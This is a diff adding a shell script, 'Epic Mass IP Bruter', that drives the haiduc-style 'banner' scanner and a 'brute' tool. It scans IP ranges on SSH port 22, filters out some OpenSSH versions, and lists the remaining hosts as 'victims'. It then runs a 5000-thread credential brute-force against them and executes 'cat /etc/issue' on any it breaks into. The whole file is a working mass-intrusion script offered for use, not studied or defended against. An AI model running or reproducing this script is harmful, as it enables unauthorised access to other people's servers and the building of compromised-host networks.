@@ -1,0 +1,43 @@
+rm -rf banner.log
+rm -rf ips.lst
+echo "######################################################################"
+echo "               Epic Mass IP Bruter By Nite Max                                                                     "
+echo "       All rights go to the creator of haiduc and banner                                                       "
+echo "######################################################################"
+sleep 5
+echo " "
+echo "######################################################################"
+echo " Im gonna scan by default, edit this file if you prefer other methods                                 "
+echo " "
+echo "Scanning starts in..."
+sleep 1
+echo "3"
+sleep 1
+echo "2"
+sleep 1
+echo "1"
+sleep 5
+echo "Banner Filter is starting!"
+sleep 5
+./banner bios.txt 22 5000
+pkill banner
+sed -i /'Debian-5ubuntu1/d' banner.log
+sed -i /'Debian-10+deb9u2/d' banner.log
+sed -i /'SSH-2.0-OpenSSH_6.7p1/d' banner.log
+cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq |shuf >> ips.lst
+victims=`grep -c . ips.lst`
+echo " "
+echo "######################################################################"
+echo "                We Have $victims vulnerable servers..!!"
+echo "######################################################################"
+sleep 5
+echo " "
+echo "######################################################################"
+echo "Ok We Are done with that shit. !"
+echo "We Are Starting brute right now! !"
+echo " "
+echo "######################################################################"
+sleep 2
+echo "BRUTE STARTING !"
+sleep 1
+./brute 5000 -f ips.lst naffey 22 "cat /etc/issue"
